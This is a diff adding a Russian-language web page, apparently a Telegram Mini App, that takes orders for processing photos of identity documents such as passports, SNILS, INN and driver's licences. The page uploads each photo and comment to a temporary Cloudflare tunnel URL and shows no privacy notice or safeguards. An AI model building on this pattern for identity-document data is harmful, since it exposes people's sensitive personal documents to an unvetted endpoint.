@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <link rel="preconnect" href="https://telegram.org">
+    <title>Подготовка фото</title>
+    <style>
+        :root { --bg: #f2f2f7; --card: #ffffff; --text: #000; --hint: #8e8e93; --accent: #007aff; --error: #ff3b30; --input-bg: #e5e5ea; }
+        @media (prefers-color-scheme: dark) { :root { --bg: #000; --card: #1c1c1e; --text: #fff; --hint: #8e8e93; --input-bg: #2c2c2e; } }
+        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; outline: none; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; display: flex; flex-direction: column; padding-bottom: env(safe-area-inset-bottom); }
+        
+        .header { padding: 24px 20px 10px; text-align: center; }
+        .header h1 { font-size: 28px; font-weight: 800; margin-bottom: 6px; }
+        .header p { font-size: 15px; color: var(--hint); line-height: 1.4; }
+        
+        .form-container { padding: 0 20px; flex-grow: 1; display: flex; flex-direction: column; gap: 20px; }
+        .field-group { background: var(--card); border-radius: 16px; padding: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); position: relative; }
+        
+        /* Стили для ошибок */
+        .field-group.error { border: 2px solid var(--error); }
+        .error-msg { display: none; color: var(--error); font-size: 13px; font-weight: 600; margin-top: 8px; animation: shake 0.3s ease; }
+        .field-group.error .error-msg { display: block; }
+        
+        .label { display: block; font-size: 13px; font-weight: 600; color: var(--hint); margin-bottom: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
+        
+        .select-wrapper { position: relative; }
+        select { width: 100%; background: var(--input-bg); border: none; border-radius: 12px; padding: 14px 40px 14px 16px; font-size: 17px; color: var(--text); appearance: none; -webkit-appearance: none; cursor: pointer; }
+        .select-wrapper::after { content: ''; position: absolute; right: 16px; top: 50%; transform: translateY(-70%) rotate(45deg); width: 10px; height: 10px; border-right: 2px solid var(--hint); border-bottom: 2px solid var(--hint); pointer-events: none; }
+        
+        textarea { width: 100%; background: var(--input-bg); border: none; border-radius: 12px; padding: 14px 16px; font-size: 17px; color: var(--text); resize: none; min-height: 100px; line-height: 1.5; }
+        ::placeholder { color: var(--hint); opacity: 0.6; }
+        
+        .upload-btn { display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; padding: 14px; background: var(--input-bg); border-radius: 12px; font-size: 16px; font-weight: 600; color: var(--text); cursor: pointer; transition: 0.2s; border: 2px dashed var(--hint); margin-bottom: 16px; }
+        .upload-btn:hover { border-color: var(--accent); color: var(--accent); }
+        .upload-btn svg { width: 20px; height: 20px; fill: currentColor; }
+        #fileInput { display: none; }
+
+        .preview-container { display: none; width: 100%; aspect-ratio: 4/3; border-radius: 12px; overflow: hidden; background: var(--input-bg); position: relative; animation: fadeIn 0.3s ease; }
+        .preview-container img { width: 100%; height: 100%; object-fit: cover; }
+        .remove-photo { position: absolute; top: 8px; right: 8px; width: 28px; height: 28px; background: rgba(0,0,0,0.6); border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+        .remove-photo svg { width: 16px; height: 16px; fill: white; }
+
+        .submit-area { padding: 20px; margin-top: auto; }
+        button#sendBtn { width: 100%; padding: 18px; border: none; border-radius: 16px; background: linear-gradient(135deg, #007aff, #5ac8fa); color: white; font-size: 17px; font-weight: 700; cursor: pointer; opacity: 0.5; pointer-events: none; transition: 0.3s; box-shadow: 0 8px 24px rgba(0,122,255,0.3); }
+        button#sendBtn.active { opacity: 1; pointer-events: auto; }
+        button#sendBtn:active { transform: scale(0.98); }
+        
+        .success-view { display: none; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; padding: 40px; background: var(--bg); position: fixed; inset: 0; z-index: 100; }
+        .success-icon { width: 90px; height: 90px; background: linear-gradient(135deg, #34c759, #30d158); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 24px; box-shadow: 0 10px 40px rgba(52,199,89,0.4); animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        .success-icon svg { width: 45px; height: 45px; fill: white; }
+        .success-title { font-size: 24px; font-weight: 800; margin-bottom: 12px; }
+        .success-desc { font-size: 16px; color: var(--hint); line-height: 1.5; max-width: 280px; }
+        
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes popIn { from { transform: scale(0); } to { transform: scale(1); } }
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
+    </style>
+</head>
+<body>
+    <div id="app">
+        <div class="header"><h1>Новый заказ</h1><p>Заполните форму для обработки фото</p></div>
+        <div class="form-container">
+            <!-- Поле типа документа с ошибкой -->
+            <div class="field-group" id="docGroup">
+                <span class="label">Тип документа</span>
+                <div class="select-wrapper">
+                    <select id="docType">
+                        <option value="" disabled selected>Выберите тип...</option>
+                        <option value="Паспорт РФ">Паспорт РФ</option>
+                        <option value="Загранпаспорт">Загранпаспорт</option>
+                        <option value="СНИЛС">СНИЛС</option>
+                        <option value="ИНН">ИНН</option>
+                        <option value="Водительское удостоверение">Водительское удостоверение</option>
+                        <option value="Другое">Другое</option>
+                    </select>
+                </div>
+                <div class="error-msg">⚠️ Пожалуйста, выберите тип документа</div>
+            </div>
+
+            <!-- Поле фото с ошибкой -->
+            <div class="field-group" id="photoGroup">
+                <span class="label">Фотография</span>
+                <label class="upload-btn" for="fileInput">
+                    <svg viewBox="0 0 24 24"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>
+                    Выбрать фото из галереи
+                </label>
+                <input type="file" id="fileInput" accept="image/*">
+                <div class="preview-container" id="previewContainer">
+                    <img id="photoPreview" src="" alt="Preview">
+                    <div class="remove-photo" onclick="removePhoto()">
+                        <svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+                    </div>
+                </div>
+                <div class="error-msg">⚠️ Пожалуйста, загрузите фотографию</div>
+            </div>
+
+            <div class="field-group">
+                <span class="label">Комментарий</span>
+                <textarea id="comment" placeholder="Например: убрать тени, выровнять перспективу..."></textarea>
+            </div>
+        </div>
+        <div class="submit-area"><button id="sendBtn">ОТПРАВИТЬ ЗАКАЗ</button></div>
+    </div>
+
+    <div class="success-view" id="successView">
+        <div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
+        <div class="success-title">Отправлено!</div>
+        <div class="success-desc">Мастер уже получил ваше фото и приступает к работе.</div>
+    </div>
+
+    <script>
+        const isTG = window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initData;
+        let tg = null;
+        if (isTG) {
+            const s = document.createElement('script');
+            s.src = 'https://telegram.org/js/telegram-web-app.js';
+            s.onload = () => {
+                tg = window.Telegram.WebApp; tg.expand();
+                tg.MainButton.color = '#007aff'; tg.MainButton.textColor = '#ffffff';
+                tg.MainButton.setText("ОТПРАВИТЬ ЗАКАЗ"); 
+                tg.MainButton.onClick(sendOrder);
+            };
+            document.head.appendChild(s);
+        } else {
+            document.getElementById('sendBtn').addEventListener('click', sendOrder);
+        }
+
+        const docType = document.getElementById('docType');
+        const fileInput = document.getElementById('fileInput');
+        const comment = document.getElementById('comment');
+        const previewContainer = document.getElementById('previewContainer');
+        const photoPreview = document.getElementById('photoPreview');
+        const appView = document.getElementById('app');
+        const successView = document.getElementById('successView');
+        const docGroup = document.getElementById('docGroup');
+        const photoGroup = document.getElementById('photoGroup');
+        let selectedFile = null;
+
+        fileInput.addEventListener('change', (e) => {
+            const file = e.target.files[0];
+            if (file) {
+                selectedFile = file;
+                const reader = new FileReader();
+                reader.onload = (ev) => {
+                    photoPreview.src = ev.target.result;
+                    previewContainer.style.display = 'block';
+                };
+                reader.readAsDataURL(file);
+                // Убираем ошибку при выборе фото
+                photoGroup.classList.remove('error');
+                checkForm();
+            }
+        });
+
+        function removePhoto() {
+            selectedFile = null;
+            fileInput.value = '';
+            previewContainer.style.display = 'none';
+            photoPreview.src = '';
+            checkForm();
+        }
+
+        docType.addEventListener('change', () => {
+            docGroup.classList.remove('error');
+            checkForm();
+        });
+        comment.addEventListener('input', checkForm);
+
+        function checkForm() {
+            const isValid = docType.value && selectedFile;
+            if (isTG && tg) isValid ? tg.MainButton.show() : tg.MainButton.hide();
+            else {
+                const btn = document.getElementById('sendBtn');
+                isValid ? btn.classList.add('active') : btn.classList.remove('active');
+            }
+        }
+
+        async function sendOrder() {
+            // ВАЛИДАЦИЯ ПЕРЕД ОТПРАВКОЙ
+            let hasError = false;
+            
+            if (!docType.value) {
+                docGroup.classList.add('error');
+                hasError = true;
+            }
+            if (!selectedFile) {
+                photoGroup.classList.add('error');
+                hasError = true;
+            }
+
+            if (hasError) {
+                // Вибрация об ошибке
+                if (isTG && tg) tg.HapticFeedback.notificationOccurred('error');
+                return; // Прерываем отправку
+            }
+
+            if (isTG && tg) tg.MainButton.showProgress();
+            else { 
+                const btn = document.getElementById('sendBtn');
+                btn.disabled = true; btn.textContent = 'Отправка...'; 
+            }
+            
+            const fd = new FormData();
+            fd.append('doc_type', docType.value);
+            fd.append('comment', comment.value);
+            fd.append('photo', selectedFile);
+
+            try {
+                // ВАЖНО: Замените на актуальную ссылку Cloudflare Tunnel!
+                const API_URL = 'https://princeton-macintosh-divided-representations.trycloudflare.com'; 
+                
+                const res = await fetch(`${API_URL}/api/order`, { method: 'POST', body: fd });
+                const data = await res.json();
+                
+                if (data.status === 'success') {
+                    appView.style.display = 'none';
+                    successView.style.display = 'flex';
+                    if (isTG && tg) {
+                        tg.MainButton.hide();
+                        tg.HapticFeedback.notificationOccurred('success');
+                        setTimeout(() => tg.close(), 2000);
+                    } else {
+                        alert("Заказ успешно отправлен!");
+                    }
+                } else {
+                    throw new Error(data.detail || 'Ошибка сервера');
+                }
+            } catch (err) {
+                const msg = 'Ошибка соединения: ' + err.message;
+                if (isTG && tg) { tg.showAlert(msg); tg.HapticFeedback.notificationOccurred('error'); }
+                else alert(msg);
+            } finally {
+                if (isTG && tg) tg.MainButton.hideProgress();
+                else { 
+                    const btn = document.getElementById('sendBtn');
+                    btn.disabled = false; btn.textContent = 'ОТПРАВИТЬ ЗАКАЗ'; 
+                }
+            }
+        }
+    </script>
+</body>
+</html>
